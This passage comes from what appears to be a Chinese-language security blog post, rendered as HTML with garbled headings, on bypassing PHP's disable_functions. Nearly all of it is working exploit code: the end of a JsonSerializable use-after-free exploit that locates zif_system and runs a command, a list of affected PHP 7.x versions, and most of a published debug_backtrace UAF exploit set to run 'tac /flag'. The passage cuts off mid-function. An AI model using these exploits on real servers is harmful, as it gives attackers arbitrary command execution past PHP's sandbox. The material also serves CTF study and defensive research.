class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$y</span>, <span class="variable">$cmd</span>, <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>, <span class="variable">$n_alloc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$contiguous</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$contiguous</span>[] = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$room</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$room</span>[] = <span class="keyword">new</span> <span class="title function_ invoke__">Z</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_protector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$y</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protector</span> = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        <span class="variable">$x</span>-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        <span class="variable">$x</span>-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line">        <span class="variable">$spl2</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        <span class="variable">$class_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        <span class="variable">$handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        <span class="variable">$php_heap</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        <span class="variable">$fake_obj</span> = <span class="variable">$abc_addr</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>, <span class="variable">$abc_addr</span>); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak1</span>(<span class="variable">$class_entry</span> + <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        <span class="variable">$fake_tbl_off</span> = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x30</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x38</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$handlers</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_off</span> = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$function_data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_data</span> + <span class="number">0x40</span> * <span class="number">4</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_bkt_off</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>, <span class="variable">$fake_bkt_addr</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x58</span> + <span class="variable">$i</span> * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        <span class="variable">$function_zval</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">12</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc,  <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_zval</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="number">0x30</span>, <span class="variable">$zif_system</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>, <span class="variable">$fake_bkt_addr</span> + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span>-&gt;<span class="title function_ invoke__">offsetGet</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">Z</span>()];</span><br><span class="line"><span class="title function_ invoke__">json_encode</span>([&amp;<span class="variable">$y</span>]);</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è¿™ä¸ªexpç„¶ååŒ…å«æ‰§è¡Œå‘½ä»¤å³å¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703244.png" alt="image-20231206170321129"><br>ä¹Ÿå¯æ’ä»¶ç›´æ¥ç”¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703867.png" alt="image-20231206170329807"></p><h2 id="åˆ©ç”¨Backtrace-UAF"><a href="#åˆ©ç”¨Backtrace-UAF" class="headerlink" title="åˆ©ç”¨Backtrace UAF"></a>åˆ©ç”¨Backtrace UAF</h2><h3 id="åˆ©ç”¨æ¡ä»¶-10"><a href="#åˆ©ç”¨æ¡ä»¶-10" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><h3 id="åˆ©ç”¨æ–¹æ³•-5"><a href="#åˆ©ç”¨æ–¹æ³•-5" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p>åŸç†ä¹Ÿæ˜¯pwn<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">EXP</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span 